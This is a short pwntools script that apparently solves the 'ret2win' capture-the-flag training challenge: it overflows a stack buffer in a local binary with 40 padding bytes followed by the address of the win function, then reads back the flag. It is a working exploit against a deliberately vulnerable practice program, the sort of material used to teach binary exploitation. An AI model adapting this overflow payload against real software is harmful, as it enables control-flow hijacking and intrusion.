from pwn import *# Set up pwntools to work with this binary

elf = context.binary = ELF('ret2win')# Print out the target address

log.info("%#x target", elf.symbols.ret2win)# Send the payload

io = process(elf.path)

ret2win = p64(elf.symbols.ret2win)

payload = b"A"*40 + ret2win

io.sendline(payload)
print(io.recvuntil("Here's your flag:")) # Get our flag!
flag = io.recvline()

print(flag)